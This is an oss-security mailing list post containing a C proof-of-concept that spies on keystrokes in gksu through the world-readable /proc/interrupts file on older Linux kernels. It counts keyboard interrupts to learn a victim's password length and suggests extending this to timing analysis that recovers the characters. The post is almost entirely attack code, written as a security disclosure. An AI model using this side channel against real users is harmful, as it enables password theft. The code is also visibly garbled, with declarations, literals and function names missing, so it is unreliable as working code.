  oss-security - /proc/interrupts PoC: spy-interrupts            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 7 Nov From: Vasiliy Kulikov <segoon@...nwall.com> To: oss-security@...ts.openwall.com Subject: /proc/interrupts PoC: spy-interrupts  /*  * A PoC for spying for keystrokes in gksu via /proc/interrupts in Linux <= 3.1.  *   * The file /proc/interrupts is world readable.  It contains information  * about how many interrupts were emitted since the system boot.  We may loop  * on one CPU core while the victim is executed on another, and learn the length  * of victim's passord via monitoring emitted interrupts' counters of the keyboard  * interrupt.  The PoC counts only keystrokes number, but it can be easily extended  * to note the delays between the keystrokes and do the statistical analysis to  * learn the precise input characters.  *   * The limitations:  *   - it works on 2-core CPUs only.  *   - it works on 1-keyboard systems only.  *   - it doesn't carefully count the first and last keystrokes (e.g. ENTER after  *     the password input).  *   - it doesn't carefully filter keystrokes after ENTER.  *   * by segoon from Openwall  *  * run as: gcc -Wall spy-interrupts.c -o spy-interrupts && ./spy-interrupts gksu  *  * P.S.  The harm of /proc/interrupts is known for a long time, but I  * was told about this specific attack vector by Tavis Ormandy just after similar  * PoC spy-sched was published.  */  #include <stdio.h> #include <stdlib.h> #include <signal.h> #include <sys/types.h> #include <sys/stat.h> #include <unistd.h> #include <fcntl.h> #include <err.h> #include <errno.h> #include <string.h>   int int  char  int reread_ints(int *interrupts, int int_count, char **names) {     int i;     int n, c1, c2;     char      int interrupts_fd;     FILE *interrupts_file;      interrupts_fd = open("/proc/interrupts", O_RDONLY);     if (interrupts_fd == -1)         err(1, "open(\"/proc/interrupts\")");      interrupts_file = fdopen(interrupts_fd, "r");     if (interrupts_file == NULL)         err(1, "fdopen");      if (fseek(interrupts_file, 0, SEEK_SET) < 0)         err(1, "lseek");      fgets(buffer, sizeof(buffer), interrupts_file);      for (i = 0; i < int_count; i++) {         if (fgets(buffer, sizeof(buffer), interrupts_file) == NULL) {             fclose(interrupts_file);             return i;         }          if (sscanf(buffer, "%d: %d %d %s %s", &n, &c1, &c2, s1, s2) < 3) {             fclose(interrupts_file);             return i;         }          if (names != NULL && names[i] == NULL)             names[i] = strdup(s2);          interrupts[i] = c1 + c2;     }      fclose(interrupts_file);     return int_count; }  void {     int i;     int     char     int number_of_interrups, can_be_keyboard_numbers;      number_of_interrups = reread_ints(ints_prev, sizeof(ints_prev), names);      /*      * Identify the interrupt associated with the keyboard by:      * 1) name should be      * 2) interrupts count emitted in one second shouldn't be more than      */     for (i = 0; i < number_of_interrups; i++)         can_be_keyboard[i] = strcmp(names[i], == 0;      while (1) {         sleep(1);         reread_ints(ints, sizeof(ints), NULL);          can_be_keyboard_numbers = 0;         for (i = 0; i < number_of_interrups; i++) {             can_be_keyboard[i] &= (ints[i] - ints_prev[i]) <             if (can_be_keyboard[i])                 can_be_keyboard_numbers++;              ints_prev[i] = ints[i];         }          if (can_be_keyboard_numbers == 1) {             for (i = 0; i < number_of_interrups; i++)                 if (can_be_keyboard[i]) {                     = i;                     keyboard is #%d\n", i);                     return;                 }         }     } }  int {     reread_ints(ints, sizeof(ints), NULL);     =      return }  int wait_for_program(char *pname) {     FILE *f;     int pid;     char      snprintf(s, sizeof(s), "while :; do pgrep %s >/dev/null && break;"            " sleep 0.1; done", pname);     system(s);     snprintf(s, sizeof(s), "pgrep %s", pname);     f = popen(s, "r");     if (f == NULL)         err(1, "popen");      if (fgets(buffer, sizeof(buffer), f) == NULL)         err(1, "fgets");      if (sscanf(buffer, "%d", &pid) < 1)         err(1, "sscanf");      pclose(f);      return pid; }  int main(int argc, char *argv[]) {     int n, old, sum, i;     int pid;     char *pname = argv[1];      if (argc < 2)         errx(1, "usage: spy-interrupts gksu");      puts("Waiting for mouse activity...");          pid = wait_for_program(pname);     printf("%s is %d\n", pname, pid);      old =      sum = 0;      while (1) {         n =         if (old == n)                     else {             for (i = 0; i < n-old; i++)                 putchar('.');             fflush(stdout);         }          sum += n - old;         old = n;          if (kill(pid, 0) < 0 && errno == ESRCH)             break;     }      /*      * #interrupts == 2 * #keystrokes.        * #keystrokes = len(password) - 1  because of ENTER after the password.      */     printf("\n%d keystrokes\n", (sum-2)/2);      return 0; }  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      